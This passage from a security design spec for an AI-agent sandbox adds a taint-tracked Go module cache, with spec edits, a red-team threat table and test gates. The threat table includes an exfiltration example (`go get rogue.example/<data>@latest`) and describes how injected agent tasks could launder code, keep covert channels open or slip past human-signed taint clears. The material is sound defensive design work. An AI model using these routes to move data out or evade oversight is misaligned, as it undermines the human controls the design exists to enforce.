3. **Presence only, seen only by the tainted, gone at the clear.** A task chooses only which public versions get stored. Only tainted tasks of the same agent can observe that, and the store is empty whenever the workspace is clean. So the cache's influence has exactly the lifetime and audience of the sticky-tainted workspace, which already carries far more.
4. **No lasting off-switch.** go re-checks every file in the default env. `go env -w` writes to the tmpfs HOME, and rootd sets the env again at each launch.
5. **Takedowns take effect at once.** The task's own filter checks every use live upstream.

**Not adopted** (from the three judged designs and earlier drafts):
- Clean cache hits and a "frozen" mode: a content hash proves integrity, not trust, so any injected task could pre-fill packages that later clean tasks read untainted.
- A box-wide fetch list and a `pkg.sync` op: proxy.golang.org fetches unknown paths from their origin, so a list not tied to the caller's allowlist relays data.
- The pin rule (pinned bytes from a clean lockfile don't taint): parked for a separate proposal after workspace stickiness is fixed.
- Cache warming, the cache in attach sessions, and shared build caches (`GOCACHE`, `target/`: no upstream hash covers them).
- A nightly re-check with a 48 h freshness window and withdrawal alerts: it left a window (attack 3), trusted the proxy (attack 10), needed task-less egress (attack 13) and gave attackers alerts to flood (attack 6). The live check replaces it.
- Lockfiles as control paths (attack 5) and `GOFLAGS=-mod=readonly` (attack 9's suggestion; it would make vendored builds fetch and taint).
- Filter-side checksum checks of every file (one lookup per version per task, for a threat that needs a compromised proxy plus an agent that disabled its own checks), and "verified" labels for vendored files of changed pins (a compromised proxy could fake them).

**Effect.** Warm Go tasks skip module downloads (15–60 s), minus 0.5–2 s of live checks. A first fill costs 1–5 s more for hashing. The first Go task after each clear is cold. Asks don't change (A-G19).

### 3.3 Spec changes (ready to paste)
Shared spots use the merged text in section 8.4: M1 (§0.6), M2 (§4.2 step 2), M4 (`net.allow_domain`), M7 (§6.2 refusals), M8 (§7 clear and the dependency report), M10 (§9), M11 (§10), M12 (§11), M13 (§13), M14 (App. C), M16 (App. E).

1. **§2 Services table, `agentbox-proxy` row.** Holds: "**no secrets**; per-agent Go module caches (`data/cache/<agent>`, §6.2)". Isolation: append "; `ReadWritePaths=/var/lib/agentbox/data/cache`". Notes: "CONNECT egress for tasks; read-only Go module cache (§6.2)".
2. **§2 Services table, new row after `osbuild-image@`:**
   ```markdown
   | `agentbox-depcheck@` | transient `DynamicUser` | none | `PrivateNetwork=yes`; `AmbientCapabilities=CAP_DAC_READ_SEARCH` and no other capability; `NoNewPrivileges=yes`; `RootDirectory=` an empty root-owned dir with `BindReadOnlyPaths=` for the binary, the two snapshots and `data/cache/<agent>`; `MemoryMax=2G`; `RuntimeMaxSec=300` | dependency report for `taint review` and `agent.attach` (§7): one JSON report on stdout, at most 16 MiB, checked by rootd against a strict schema; started by rootd like `osbuild-*@` |
   ```
3. **§2 Common hardening, new bullet:**
   ```markdown
   - **No btrfs ioctls in services.** Every non-root agentbox service (agentboxd, auditd, approvald, proxy, keys, git) installs a seccomp filter at start. An `ioctl` whose type byte is `0x94` returns `EOPNOTSUPP` (the §4.2 rule), and a non-native arch kills the process. The service installs it with `seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC)` under `NoNewPrivileges=yes`; if the install fails, the service exits. systemd's `SystemCallFilter=` can't match ioctl arguments, so the binary installs the filter itself. No service can then create a subvolume outside `2/0` in `data/cache/`, `git/`, `state/` or `memory/`.
   ```
4. **§2.1 Socket inventory.** Row `resolve-<svc>.sock`: change the note to "(resolution requests; keys also sends `llm.recycle`; the proxy also sends `cache.alert{agent, reason}`)". Row `svc-<svc>.sock`: append "; the proxy also takes `cache.purge{agent}`". Under the table, add: "taskrun's Go module filter (§6.2) listens on `127.0.0.1:8083` inside the container only. It uses the task's existing gate socket (`task.taint_self`) and proxy socket. Every proxy resolution request names a live task." No new socket.
5. **§3.2 Persistence domains.** The row "agentbox fillable stores" becomes "workspaces, agent storage and session homes, Go module caches, images (`/var/lib/agentbox/data`)".
6. **§4.1 Accounts.**
   - Subvolumes, append: "`data/cache/<name>` (owner `agentbox-proxy`, mode 0700; §6.2), made at `agent.add`. It is assigned to `1/N` and also gets its own exclusive limit, `cache.agent_max_bytes`; `budget.set` re-applies it. `data/cache` itself is root-owned, mode 0711."
   - No nested subvolumes, append: "rootd's hourly sweep also runs `btrfs subvolume list -o` on each `data/cache/<name>` and alerts on any hit. The service filter (§2) should make that impossible."
   - Removal: before "→ archive the subvolumes", insert "→ `cache.purge{agent}`, then delete `data/cache/<name>` by name from the root-owned `data/cache` dirfd (public module files only; not archived)".
7. **§4.2 Tasks.**
   - Inside the container, step 2: M2.
   - Replace the bullet "**No shared caches** (npm, pip, mise) between tasks in v1. Tools are baked into the image." with:
     ```markdown
     - **One cache: Go modules, read-only to tasks** (§6.2). rootd sets the Go env at `task.start` from the agent's allowlist (App. C). With `proxy.golang.org:443` on it: `GOPROXY=http://127.0.0.1:8083,https://proxy.golang.org,direct` and `GOSUMDB=sum.golang.org`. Without it: `GOPROXY=off`, so go fails at once with its own error and opens no CONNECT. `GOTOOLCHAIN=local` is always set, so go stays on the image Go unless the agent sets `GOTOOLCHAIN=auto` itself (that download then taints like any fetch). `GOPRIVATE` comes from the admin's `go.private` patterns, if set. taskrun unsets `GOFLAGS`, `GONOSUMDB`, `GONOPROXY` and `GOINSECURE` before the CLI starts, so only the admin scopes private paths. It doesn't set `GOFLAGS=-mod=readonly`: an explicit `-mod` makes go ignore `vendor/` ✓, and build commands already never resolve an unpinned version ✓. `GOMODCACHE` and `GOCACHE` stay in the tmpfs HOME. No other cache is shared between tasks in v1: not npm, pip, cargo or mise, and no build cache. Tools are baked into the image.
     - **Quiet package managers.** taskrun sets `npm_config_audit=false`, `npm_config_fund=false`, `npm_config_update_notifier=false`, `NO_UPDATE_NOTIFIER=1` and `PIP_DISABLE_PIP_VERSION_CHECK=1`. With a fresh HOME these checks would run, and taint the task, in every task.
     - These variables are defaults, not controls. An override either reaches the network through CONNECT and taints, or trusts cache bytes inside a task that the filter and the proxy have already tainted. Nothing outlives the task: `go env -w` writes to the tmpfs HOME, and rootd sets the env again at each launch.
     - Attach sessions don't use the Go module cache. session-home keeps its own `GOMODCACHE`, and a persistent HOME could turn checksum checks off for later sessions.
     ```
   - Control paths: no change. Lockfiles are not control paths; §7 has the dependency report.
   - Interactive sessions, after the `--ack-control-changes` bullet, add: "rootd also refuses `agent.attach` while the dependency report (§7) for the same snapshot pair has high-risk items. The admin can pass `--ack-dependency-changes` after viewing them. Routine dependency changes never block attach. `--ack-control-changes` doesn't pass this gate, and `--ack-dependency-changes` doesn't pass the control-path gate."
8. **§5.2 Compromise bound.** Append to the paragraph that starts "It also controls bus content": "It can also skip `task.taint_self` (§6.2); for Go cache files the proxy's own taint record then still applies."
9. **§5.3 Ops.**
   - Admin row: add `cache.purge{agent}` and `go.private.set{agent, patterns}`. Under the table, add: "`cache.purge`: rootd sends it to the proxy on `svc-proxy.sock`. The proxy cancels the agent's in-flight fills, then deletes its rows, blobs and checksum state. It needs no approver signature, because it only deletes cached public files. `go.private.set` writes `control/egress/<agent>.goprivate`: comma-separated `path.Match` globs of module path prefixes, ASCII, at most 1 KiB. Both are keep-class in audit. Agents get no cache op."
   - `taint.clear` row. Bound inputs: append "and, for `workspace:`, the dependency report's SHA-256 and its high-risk count (§7)". Floor: append "for `workspace:` subjects, rootd purges the agent's Go module cache before the INTENT, and refuses with `CACHE_PURGE_FAILED` if a running proxy doesn't confirm (§7)".
   - Under the table, add: "**Internal calls** (not registry ops, not Cedar-gated): `task.start` and `task.stop` (§4.2), and `task.taint_self{source}` on the gate socket (§6.2). `task.taint_self` can only add taint to the calling task, so the worst misuse is a task tainting itself."
   - `net.allow_domain` row: M4.
10. **§5.4 CLI rendering.** Step 2, append: "For `net.allow_domain` of a host in the registry constant `deputyHosts` (`proxy.golang.org:443`, `sum.golang.org:443`), the template adds a fixed line before the typed host:port: `DEPUTY HOST: it fetches from any origin a request names, so data can leave through it, even from a tainted task.`" Step 5, append: "For `taint review`, the CLI also renders the dependency report (§7). It checks the report's SHA-256 against the bound one, shows high-risk items first, and requires the human to type their count before the key signs."
11. **§6.1 and Appendix B.** No change. Fills dial only the `proxy_dst` entries rootd added for `proxy.golang.org:443` for a live task, like a CONNECT. The filter's live checks are ordinary CONNECTs. fwcheck is unchanged.
12. **§6.2 Proxy.**
    - Taint classes bullet, append: "The Go module cache (below) records exactly the taint a CONNECT to `proxy.golang.org:443` would, twice: once from taskrun's filter through the gate, once from the proxy. Both records come before any module byte, so the cache never makes a caller cleaner than that CONNECT. There is no lower taint tier for registries or docs: what a tainted task may do without a human depends on where it writes, never on what it read (§5.3, §8)."
    - "What it can't see", append: "`proxy.golang.org` and `sum.golang.org` are deputy hosts (registry constant `deputyHosts`). They fetch any origin a module path names, so for them write-capable includes sending data to arbitrary origins. They are never in `common.list` (rootd refuses to load a `common.list` that names one), only a human can add them (§5.3), and `net.allow_domain` shows a fixed deputy line for them (§5.4). The Go cache can't contain this channel, because `@v/list`, `@latest` and checksum lookups never reach it."
    - Step 1 and refusals: M7.
    - New block after "What it can't see":
      ````markdown
      **Go module cache (read-only to tasks).**
      - **Why a filter.** go tries `GOPROXY` entries in order and moves on only on 404 or 410 ✓ (`modfetch/proxy.go`, TryProxies). It checks every `.mod` and `.zip` against go.sum, or against the signed checksum database when go.sum has no line ✓ (`modfetch/fetch.go`, checkModSum). But it sends every request, including the unsigned `@v/list`, `@latest` and `.info`, to the first entry first. So the first entry is a filter inside the task, and the proxy never sees an unsigned Go request.
      - **Task-side filter** (taskrun, `127.0.0.1:8083`, inside the container). taskrun starts it only when rootd set the cache `GOPROXY`. It is part of the read-only agentbox binary and keeps no state beyond the task.
        1. *Grammar.* Only `GET /<module>/@v/<version>.{info,mod,zip}`, with no query string, no `%` in the raw path and no body. It unescapes with `module.UnescapePath` and `module.UnescapeVersion`, and requires `module.Check(path, version)`, `module.CanonicalVersion(version) == version` (this keeps `+incompatible` ✓), and no match in the agent's `go.private` patterns. Everything else (`@v/list`, `@latest`, `/sumdb/...`, branches, partial versions, commit hashes) gets the filter's own 404 and is never forwarded. go then asks proxy.golang.org over CONNECT, with TLS end to end.
        2. *Taint.* Before its first request to the proxy, the filter calls `task.taint_self{source: cache:go}` on the task's gate socket and waits for the reply. agentboxd sends auditd the same taint record the proxy applies to `proxy.golang.org:443`, and replies after the ACK. If the call fails, the filter answers 404 to everything for the rest of the task, and go uses CONNECT as in v5.2.
        3. *Live check.* Once per version per task, the filter fetches `https://proxy.golang.org/<module>/@v/<version>.info` through a CONNECT on the task's proxy socket: TLS with SNI `proxy.golang.org` and the image's roots, no redirects, a 64 KiB cap, a 10 s timeout, and one reused HTTP/2 connection (HTTP/1.1 keep-alive if HTTP/2 over the tunnel fails). Only a 200 whose JSON `Version` equals the request makes the version available. Anything else makes every file of that version 404. A failure is retried after 60 s and is never cached longer.
        4. *Serve.* `.info`: the upstream body from step 3; never from the cache. `.mod` and `.zip`: only for an available version, by `GET /_cache/go/<module>/@v/<version>.<ext>` on the proxy socket. A 200 body streams through unchanged; any other status becomes 404, and go falls back. No cache byte reaches go before step 3 returned 200 for that version.
      - **Proxy cache request** (a task's own proxy socket only; attach and app egress sockets answer 404 for `/_cache/`), in order:
        1. *Grammar.* Only origin-form `GET /_cache/go/<module>/@v/<version>.{mod,zip}`, with the filter's checks, for a path that matches none of the agent's patterns in `control/egress/<agent>.goprivate`. Anything else under `/_cache/`, `.info` included, gets 404, or 405 for another method: no lookup, no upstream request and no taint. A request path never becomes a file name.
        2. *Allowlist.* `proxy.golang.org:443` must be on the calling agent's allowlist, checked as in CONNECT step 1. Otherwise: 404, no taint, no lookup.
        3. *Taint first.* The proxy writes the INTENT a CONNECT to `proxy.golang.org:443` would write for this task (same class, source `cache:go`) and waits for the ACK before any lookup and any response byte. It writes one record per task; concurrent first requests share it. While auditd is down, every cache request gets 503 with no body.
        4. *Hit.* The proxy opens `blobs/<sha256>` with `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` from the agent's store dirfd, checks the SHA-256 against the row before the first byte, then streams the blob. On a mismatch it deletes the row and the blob, counts `blob_corrupt`, and continues as a miss.
        5. *Miss.* The proxy fills (below), then streams the stored blob. On any failure it returns 404; go then falls back to CONNECT and checks the same hashes itself.

        Steps 1 and 2 read only the request and the policy. Everything that depends on cache state (hit, miss, caps, errors, timing) comes after step 3.
      - **Fill** (only the proxy writes). Preconditions, all required: step 2 passed; this task's fills are under `cache.task_fill_max_bytes` (2 GiB) and `cache.task_fill_max_files` (20000); the agent's fills today are under `cache.agent_fill_day_bytes` (4 GiB); one of the agent's 8 fill slots frees within 30 s (otherwise 404); pool free space is above `disk.reserve_bytes`.
        1. Resolve `proxy.golang.org:443` through rootd on `resolve-proxy.sock`, naming the task. rootd re-checks that agent's allowlist and adds the answers to `proxy_dst`. The proxy dials only those addresses (§6.3), uses TLS with SNI `proxy.golang.org`, sends GET only, follows no redirects, and sends no credentials or cookies. The URL is built from the validated path and version.
        2. Stream into `tmp/<random>` (`O_EXCL`, 0600). Stop at the x/mod limits ✓: 500 MiB per `.zip`, 16 MiB per `.mod`.
        3. Check against the signed log. `sumdb.Client.Lookup(path, version)` reads `https://proxy.golang.org/sumdb/sum.golang.org/` (same host, same allowlist entry, same pinned dialing), with this agent's own tree state and tiles under `sumdb/`, and the key the go command pins ✓ (`modfetch/key.go`: `sum.golang.org+033de0ae+Ac4zctda0e5eza+HJyk9SxEdh+s3Ux18htTTAD8OuAn8`). A `.zip` must pass `zip.CheckZip` ✓, and `dirhash.HashZip(file, Hash1)` must equal the version's h1 line. A `.mod` must hash, with `dirhash.Hash1` over the bytes as the file `go.mod` (the go command's goModSum ✓), to the `/go.mod` h1 line.
        4. Store. fsync the file, chmod it 0444, and `renameat2(RENAME_NOREPLACE)` it to `blobs/<sha256>`; EEXIST means the same bytes are already there, so drop the temp file. fsync `blobs/`. Send the fill's audit record and wait for its ACK. Then insert the index row, but only while the filling task is still registered; revocation cancels the task's fills. A crash before the row leaves at most an orphan blob, which the start sweep removes. The temp file sits in the proxy's own 0700 store, so no other writer can change it between the hash and the rename.

        Failures delete the temp file, audit, and return 404. A version the log doesn't hold gets a plain 404, not an alert.
      - **Alerts** fire only for events no task can cause: `sum_mismatch` (upstream bytes differ from the record `sum.golang.org` signed for that version), `sumdb_security` (the checksum log is inconsistent; that agent's fills stop until `cache.purge`), and `blob_corrupt` (a stored blob no longer matches its row). The proxy sends `cache.alert{agent, reason}` on `resolve-proxy.sock`, as keys sends `llm.recycle`. rootd sends at most one ntfy alert per agent per 24 h, from a fixed template with the agent name and a count per reason. Details stay in audit.
      - **Availability and withdrawal.** The consuming task checks availability live on every use (filter step 3), so from the moment upstream withdraws a version no task gets it from the cache. The proxy makes no request without a live task: there is no re-check job, no freshness window and no withdrawal alert. A withdrawn version's rows idle out. Retractions are read upstream, through `@v/list` and `@latest`. A stored h1 is never re-read: the log is append-only.
      - **One store per agent.** Nothing is shared across agents: no files, rows, checksum state, tiles, fill slots, fill coalescing or HTTP connection pool, and no shared page cache (blobs are separate files). Agent B's miss is a real upstream fetch even when agent A holds the file. Within an agent, hit, miss and timing come back only after the caller's taint records, so only tainted tasks see them, and only until the next clear.
      - **Store, caps, eviction, purge.** `data/cache/<agent>` (§4.1) holds `index.db`, `blobs/`, `sumdb/` and `tmp/` (App. E). Before a fill would pass 90% of `cache.agent_max_bytes` (8 GiB), the proxy deletes least-recently-used rows until usage is under 80%, then each blob that no row names. Nightly it drops rows idle for more than `cache.max_idle_days` (30); this is local work, with no network. At start it deletes `tmp/`, blobs with no row and rows with no blob. Eviction only turns a hit into a miss; an open stream keeps its file. `cache.purge{agent}` cancels that agent's in-flight fills, waits for them to stop, deletes the rows, blobs, `tmp/` and checksum state, and replies. `taint.clear{workspace:<agent>}` purges first (§7). **Invariant: an agent's store is empty whenever its workspace is clean.** Every fill comes after its task's taint record, which also taints the workspace (writers, §5.2); only `taint.clear` makes the workspace clean, and it purges first; no task runs during a clear.
      - **Audit.** One record per filled file {agent, task, key, sha256, h1, bytes, result}, ACKed before the index row is written. One record per mismatch, checksum-log error, corrupt blob and purge. Hits are not logged one by one.
      - **A compromised proxy** can omit its own taint records (the filter's gate record still taints the task, unless agentboxd is also compromised), deny or slow Go fetches, see which public module versions each agent fetches (CONNECT showed it only the host), fill each store up to its limit, and serve forged `.mod` or `.zip` bytes to a task that turned go's checks off or skipped the filter. It can't answer `@v/list`, `@latest`, `.info` or checksum requests (the filter never forwards them), serve a withdrawn version to a task (the task checks over TLS itself), make go accept a file that the signed log or go.sum doesn't hold in the default env, create nested subvolumes (§2), reach a host rootd didn't resolve, or clear taint.
      - **Private paths.** The admin op `go.private.set{agent, patterns}` writes `control/egress/<agent>.goprivate`. rootd passes the patterns as `GOPRIVATE` at launch. go then fetches those paths directly and skips the checksum database ✓ (`GONOPROXY` and `GONOSUMDB` default to `GOPRIVATE`, `cfg/cfg.go`). The filter and the proxy refuse those paths, so no fill or lookup names them.
      - **Other ecosystems** join only if all of these hold: (a) the client falls back to the network on a miss, so the cache serves no metadata; (b) it checks every served file against a hash it already holds, or against a signed log; (c) a task-side filter keeps every unsigned request on end-to-end TLS and checks availability live; (d) two taint records before any byte, the CONNECT class, one store per agent, and purge on clear; (e) the dependency report (§7) covers its installed trees. npm, PyPI and crates fail (a) today: npm and cargo take one registry, and pip's extra indexes merge instead of falling back. A later npm cache must also store only SHA-512 tarballs pinned verbatim in a root-owned copy of the lockfile, build URLs from the validated name and version (never from lockfile URLs), serve tarballs from a read-only per-task view, and send all metadata over CONNECT.
      - **Why §0.6 holds.** No write path: tasks have no mount of the store, only a GET grammar checked twice, and only the proxy writes. Fixed content: only public `.mod` and `.zip` bytes that match the signed record, which no task authors. Presence only, seen only by the tainted, gone at the clear: a task chooses only which public versions are stored, only tainted tasks of the same agent can observe it, and the store is empty whenever the workspace is clean. No lasting off-switch: go re-checks every file, `go env -w` writes to the tmpfs HOME, and rootd sets the env again at each launch. Takedowns take effect at once: the task's own filter checks every use live upstream.
      ````
13. **§6.3 Pinned dialing**, append: "The proxy's cache fills use the same pinned dialing, with `CheckRedirect` returning an error and no cookie jar. The proxy makes no upstream request without a live task."
14. **§7 Clearing taint:** M8 (purge before INTENT, and the dependency report block).
15. **§9 Audit:** M10 (two new taint producers, cache records).
16. **§10:** M11. **§11:** M12.
17. **§12 Layout.** The data line becomes `/var/lib/agentbox/data/{images/,agents/<name>/{account,storage,session-home},workspaces/<name>,cache/<name>/{index.db,blobs/,sumdb/,tmp/}}     (@var_lib_agentbox_data)`. In the control line, `egress` now also holds `<agent>.goprivate`. "Under qgroup `2/0`": change "every agent's `1/N` (in `data/`)" to "every agent's `1/N` (in `data/`, including `data/cache/<name>`, which also has its own limit)". Users and groups: no change (depcheck runs as a transient DynamicUser).
18. **§13 Tooling:** M13.
19. **§14 Code.** Packages: add `internal/depcheck`, `internal/proxy/gocache` and `internal/taskrun/gomodfilter`. Go dependencies: add `golang.org/x/mod` (module, semver, modfile, zip, sumdb, sumdb/dirhash; BSD-3) for the cache, the filter and depcheck, and `github.com/BurntSushi/toml` (MIT) for `Cargo.lock` and `uv.lock` in depcheck. The service seccomp filter uses `x/sys/unix` (no new dependency).
20. **§16 Out of scope.** Change "shared caches between tasks" to "shared caches between tasks, except the read-only Go module cache (§6.2); npm, PyPI and crates caches until their clients meet the §6.2 join rule; shared build caches; a private module proxy as the Go cache upstream".
21. **§17:** no change to the round-3 row "Shared HOME defeats task isolation"; it is history. Round 6 is added (section 10.5).
22. **Appendix C:** M14. **Appendix D:** no change for A: `cache.purge` and `go.private.set` are admin ops (`human-all`), and `task.taint_self` is not Cedar-gated. **Appendix E:** the cache index, in M16.

### 3.4 Threats and mitigations

| # | Red-team attack (severity) | How v5.3 closes it |
|---|---|---|
| 1 | `proxy.golang.org` as a data-out deputy: an injected task runs `go get rogue.example/<data>@latest`, and the proxy fetches the path from the attacker's origin (medium) | The channel is the v5.2 CONNECT channel; the cache adds no destination and can't contain it (`@v/list`, `@latest` and checksum lookups bypass it). v5.3 closes the exposure regression: `deputyHosts` are never in `common.list`, only a human can add them (`HUMAN_ONLY{deputy_host}`, R4), the approval shows a fixed DEPUTY HOST line, and agents without them get `GOPROXY=off`. §6.2 and §10 name both hosts. An agent that must not have a deputy builds from a reviewed `vendor/` tree. v2: a private module proxy as the upstream. |
| 2 | A covert channel survives `taint.clear`: task A stores a chosen set of versions, and task B probes hit or miss after the clear (low) | `taint.clear{workspace:}` purges the cache after the swap and before its INTENT, and cancels in-flight fills; a fill inserts its row only while its task is registered. Proxy stopped: rootd re-creates the empty store. Proxy hung: the clear is refused (`CACHE_PURGE_FAILED`). Invariant: the store is empty whenever the workspace is clean. |
| 3 | A later task gets a withdrawn module inside the freshness window (low) | There is no window. Before any cache byte, the task's own filter fetches that version's `.info` from proxy.golang.org over TLS. A 404 or 410 there makes the filter answer 404, and go behaves exactly as with no cache. |
| 4 | Vendored code laundered past a path-only review: a task edits `vendor/x/y/z.go`, leaves go.sum alone, the human clears, and a clean task runs it (high) | depcheck maps every changed dependency file to its package. Drift (content changed, pin unchanged) is the first high-risk item, with its content diff. The clear needs a typed high-risk count, bound into H with the report's SHA-256. A vendored file counts as verified only if it is byte-identical to a cached zip whose HashZip equals an unchanged, already reviewed go.sum line. |
| 5 | Lockfile churn desensitizes the attach gate, so a planted `.mcp.json` gets acknowledged by habit (medium) | Lockfiles are not control paths; the v5.2 list and `--ack-control-changes` are unchanged. A separate `--ack-dependency-changes` covers only the high-risk set. Routine churn never blocks attach. Neither flag passes the other's gate. |
| 6 | Attacker noise masks withdrawal alerts (medium) | There are no withdrawal alerts; the live check enforces takedowns. Alerts fire only for `sum_mismatch`, `sumdb_security` and `blob_corrupt`, which no task can cause, at most one fixed-template ntfy per agent per day. |
| 7 | Unsetting GOPRIVATE leaks private module paths to sum.golang.org (low) | `go.private.set{agent, patterns}` (admin) sets GOPRIVATE; go fetches those paths directly and skips the checksum database ✓; the filter and the proxy refuse them. taskrun still unsets GONOSUMDB, GONOPROXY, GOINSECURE and GOFLAGS, so only the admin sets the scope. |
| 8 | The dependency review is unreadable at scale: one bad pin hides among thousands (low) | The report is ranked: drift, pin anomalies, new packages with installed code (imported ones first), changed pins with installed code. Routine changes are summarized and counted. The high-risk set has its own typed count. A pin with no installed code can't run untainted, because its later fetch taints. |
| 9 | A compromised proxy forges `@v/list` or `@latest` to steer an unpinned `go get` to an old version (medium) | The proxy never sees an unsigned request: the filter answers them with its own 404, so go gets them from proxy.golang.org over TLS, and `.info` comes from the filter's TLS check. The proxy can serve only `.mod` and `.zip` for a version go already chose, and go checks those. `GOTOOLCHAIN=local` stays. |
| 10 | A compromised proxy serves withdrawn versions forever (medium) | The proxy no longer enforces withdrawal; the consuming task's filter checks each version live over TLS. A compromised proxy can only refuse the CONNECT, which fails closed. |
| 11 | An agent turns go's checks off and a compromised proxy feeds it forged files (low) | Not closed: an accepted bounded residual (R41), stated in §10 (M11). It needs two failures at once: a compromised proxy, and task code (an injection or a repo script) that sets `GOSUMDB=off` or `GONOSUMDB`, which taskrun never does. Through the filter, the proxy can deliver only `.mod` and `.zip`, and the gate record taints the task before the first forged byte; the proxy can't omit that record. Skipping the filter takes hand-built `/_cache/` requests, so the task is already running injected code, and is tainted unless a broker omitted the taint of the content that carried it (the v5.2 broker residual). So the forged code runs in a task that is tainted or already runs attacker code. It gains nothing that code lacks: every non-read, non-Safe op still needs a signature, and the only unsigned ways out are the pre-existing write-capable and deputy hosts. The override lasts one task, and forged code left in the workspace is a dependency change at the next clear (§7). |
| 12 | A compromised proxy omits the taint record, so module source reaches a clean task (medium) | A second producer: the filter calls `task.taint_self`, and agentboxd records the same taint with auditd before any byte. Through the filter, cache files reach a task untainted only if agentboxd is also compromised. CONNECT content keeps the v5.2 residual. |
| 13 | The nightly re-check as task-less egress that a compromised proxy drives (low) | The re-check is gone. Every resolution request names a live task. Eviction is local work with no network. |

Other threats:
- **Cache poisoning by a task.** Tasks have no mount of the store, only a GET grammar checked twice, and a request path never becomes a file name. Only the proxy writes, and only bytes whose h1 matches the signed record; go checks every file again.
- **Laundering by pre-fill.** Two taint records (gate and proxy) come before any cache byte and match the CONNECT they replace. Entries are never clean, and every clear purges the store. A-G19 compares taint and asks with the cache on and off.
- **Injection in module content.** The task is tainted before it gets any module byte, so every non-read, non-Safe op needs a signature, as today. The cache holds no credentials and adds no write path.
- **New egress or a relay through fills.** Fills run only for a live task whose agent allowlists `proxy.golang.org:443`, with rootd resolution, pinned dialing, GET only, no redirects, and URLs built from the validated path and version.
- **Cross-agent signals.** Nothing is shared between agents (subvolume, index, checksum state, tiles, fill slots, coalescing, connection pool).
- **Compromised upstream or network path.** TLS with pinned dialing; the checksum record must be signed with the pinned key and consistent with the agent's last verified tree; a mismatch is refused and alerted, and go checks again.
- **Disk exhaustion.** Each store sits in its agent's `1/N` with its own kernel limit; per-task byte and file caps and a daily cap; LRU eviction; no fill below `disk.reserve_bytes`; no service can create a subvolume outside `2/0`.
- **Hostile input to the proxy, the filter or depcheck.** x/mod parses paths and versions; blobs open by digest with openat2; zips are hashed within the x/mod limits and never extracted; `.info` is capped at 64 KiB; depcheck has no network, no write path and no view beyond its two snapshots and the agent's cache, and its report is schema-checked and escaped. A compromised depcheck can only understate the report, and the full file diff still follows it. All parsers are fuzzed (A-G14, A-G17).
- **Judge findings folded in:** the hit path's allowlist check is written down (proxy step 2); the nested-subvolume gap gets a seccomp rule, not only the hourly sweep; withdrawn versions no longer idle for 30 days before they stop being served; Go is put in the image.

### 3.5 Gates
- **A-G1 (weeks 5–6, env).** For an agent with `proxy.golang.org:443` on its allowlist, `env` inside a task shows `GOPROXY=http://127.0.0.1:8083,https://proxy.golang.org,direct`, `GOSUMDB=sum.golang.org`, `GOTOOLCHAIN=local`, the npm and pip flags and `NO_UPDATE_NOTIFIER=1`. For an agent without it, `GOPROXY=off`, and `go mod download` on a fixture fails at once with go's own error and opens 0 CONNECTs. `GOPRIVATE` equals the admin's patterns or is absent. None of `GOFLAGS`, `GONOSUMDB`, `GONOPROXY` or `GOINSECURE` appears, even when the image sets them. `go version` prints the image's pinned Go. A task writes into `$GOCACHE`, `~/go/pkg/mod` and `~/.npm`, and the next task sees none of it. In a JS fixture with `node_modules` present, `npm test` opens 0 CONNECTs; `pip list` in a fresh task opens 0 CONNECTs.
- **A-G2 (weeks 5–6, toolchain and control paths).** A `go.mod` that needs a newer Go than the image fails with go's own toolchain error and opens no CONNECT. A task that changes only `go.mod`, `go.sum` and `package-lock.json` doesn't make `agent.attach` ask for `--ack-control-changes`. A planted `.mcp.json` still does.
- **A-G3 (weeks 7–8, upstream facts).** On the image's Go, re-check each ✓ fact in section 3.2 against its source. Against the live service: proxy.golang.org answers `.zip` with 200, not a redirect; a known taken-down version answers 404 or 410 on `.info`; HTTP/2 works over the CONNECT tunnel. If either of the first two fails, rootd never sets the filter `GOPROXY` (v5.2 Go behavior, R25). If HTTP/2 fails, the filter uses HTTP/1.1 keep-alive.
- **A-G4 (weeks 7–8, warm start).** One agent runs `go test ./...` twice on a fixture with 60+ modules. The second task opens exactly one CONNECT to proxy.golang.org (the live-check tunnel), which carries under 2 MiB downstream. The second `go mod download` takes under 6 s and at most a third of the first. The proxy's nft drop counter stays at 0. The first task's fills appear as one audit record per file.
- **A-G5 (weeks 7–8, no write path, two grammars).** A task has no mount under `/var/lib/agentbox/data/cache` (mountinfo). The filter answers each of these with its own 404 and sends nothing on the proxy socket (socket trace): `@v/list`, `@latest`, `/sumdb/sum.golang.org/supported`, a branch, a partial version, a commit hash, a query string, a bad escape, a GOPRIVATE path. Sent straight to the proxy socket, each of these gets 404 or 405 with no taint record, no upstream request and no store change: a non-GET method, an absolute-form request, a body, `../`, `%2e`, `.info`, `@latest`, `@v/list`, a version query, a bad escape, a GOPRIVATE path. A `+incompatible` version and a pseudo-version are both served.
- **A-G6 (weeks 7–8, taint first, two producers).** A clean task's first cache use taints it before the first module byte, for a hit and for a miss: one gate record (`task.taint_self`) and one proxy record, both source `cache:go`. 20 parallel first requests give exactly one record per producer. With a test proxy build that writes no taint record, the task is still tainted before the first byte. With auditd stopped, every proxy cache request gets 503 and 0 body bytes. With agentboxd stopped, the filter serves nothing and go falls back to CONNECT. A clean Go task with `vendor/` makes no cache request and ends clean.
- **A-G7 (weeks 7–8, parity).** Take `proxy.golang.org:443` off the allowlist: the next task gets `GOPROXY=off`, and a direct `/_cache/` request gets 404 with no taint and no lookup. Remove the filter entry from `GOPROXY` instead: `go test` output and task taint match a run with the cache.
- **A-G8 (weeks 7–8, poisoning and a hostile proxy).** (a) A test build with a test checksum key points at a local upstream that serves an altered zip: the fill is refused, `sum_mismatch` is counted, and no row or blob is stored. (b) On the production build, alter a blob and its row together: go stops with a checksum error, with and without a go.sum line, and builds nothing. (c) Flip one byte in a blob alone: the entry is deleted and refilled, and the task passes. (d) A hostile test proxy answers every `/_cache/` path with forged lists, a forged `@latest`, a forged `.info` time and its own `/sumdb/` tree: its request log shows only `.mod` and `.zip` GETs, and `go get example.com/m` and `go list -m -json example.com/m@<v>` give the same version and time as with no cache. (e) A mock upstream answers 410 on `.info` for a version the hostile proxy still serves: the filter returns 404 for that version's `.mod` and `.zip`.
- **A-G9 (weeks 7–8, isolation).** Agent B asks for a module only agent A holds: a real upstream fetch is logged under B, an inotify watch on `data/cache/A` sees no event, and B's latency matches a cold fill. An attach session's egress socket and an app's egress socket both get 404 for `/_cache/`, with no taint.
